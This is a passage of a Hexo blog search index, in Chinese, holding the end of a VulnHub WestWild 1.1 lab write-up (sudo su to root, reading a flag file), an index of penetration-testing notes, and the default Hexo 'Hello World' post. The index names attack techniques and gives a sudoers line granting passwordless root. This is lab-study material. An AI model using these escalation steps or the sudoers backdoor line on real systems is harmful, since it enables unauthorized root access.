(ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>用户的 <code>sudo -l</code> 显示此用户有全部权限，那就切换用户吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">aveng@WestWild:~$ su -<br>Password: <br>su: Authentication failure<br>aveng@WestWild:~$ sudo su<br>root@WestWild:/home/aveng# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@WestWild:/home/aveng# ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    link/ether 08:00:27:f6:8c:99 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fef6:8c99/64 scope link <br>       valid_lft forever preferred_lft forever<br>root@WestWild:/home/aveng# whoami<br>root<br>root@WestWild:/home/aveng# sudo -l<br>Matching Defaults entries for root on WestWild:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User root may run the following commands on WestWild:<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>提权成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@WestWild:/home/aveng# cd /root<br>root@WestWild:~# ls -liah<br>total 36K<br> 7689 drwx------  3 root root 4.0K Aug  2  2019 .<br>    2 drwxr-xr-x 21 root root 4.0K Jul 30  2019 ..<br> 1097 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc<br>69681 drwx------  2 root root 4.0K Jul 31  2019 .cache<br>69869 -rw-r--r--  1 root root  122 Jul 31  2019 FLAG2.txt<br> 1098 -rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>69835 -rw-r--r--  1 root root   75 Jul 31  2019 .selected_editor<br>69677 -rw-------  1 root root 4.9K Jul 31  2019 .viminfo<br>root@WestWild:~# cat FLAG2.txt <br>Flag2&#123;Weeeeeeeeeeeellco0o0om_T0_WestWild&#125;<br><br>Great! take a screenshot and Share it with me in twitter @HashimAlshareff <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/05/1122f47ad30c.html"/>
    <url>/2023/05/1122f47ad30c.html</url>
    
    <content type="html"><![CDATA[<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><p>[[Kioptrix1.2靶机]]</p><p>[[Billu_b0x靶机]]</p><p>[[WestWild 1.1靶机]]</p><p>[[BNE0x03Simple靶机]]</p><p>[[Nullbyte靶机]]</p><p>[[PC 靶机]]</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>#LotusCMS远程代码执行 [[Kioptrix1.2靶机.md|Kioptrix1.2靶机LotusCMS]]</p><p>#SQL注入绕过登录 [[Billu_b0x靶机#SQL 注入]]</p><p>#用户可写目录 [[WestWild 1.1靶机#查看用户可写目录]]</p><p>#CuteCMS远程文件上传漏洞 [[BNE0x03Simple靶机#CuteCMS2.0.3 文件上传漏洞]]</p><p>#gRPC配置不安全 [[PC 靶机#SQL 注入]]</p><p>#pyLoad预授权远程代码执行漏洞 [[PC 靶机#CVE-2023-0297 Pre-auth RCE in pyLoad]]</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>#ht编辑器提权 [[Kioptrix1.2靶机.md#ht软件编辑器提权]] :&#x2F;etc&#x2F;sudoers <code>myuser ALL=(ALL) NOPASSWD: ALL</code></p><p>#密码重用 [[Billu_b0x靶机#密码重用 ssh 登录]]</p><p>#overlayfs内核提权 [[Billu_b0x靶机#内核提权]] [[BNE0x03Simple靶机#提权]]</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>knowledge</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/05/d57b13de7450.html"/>
    <url>/2023/05/d57b13de7450.html</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
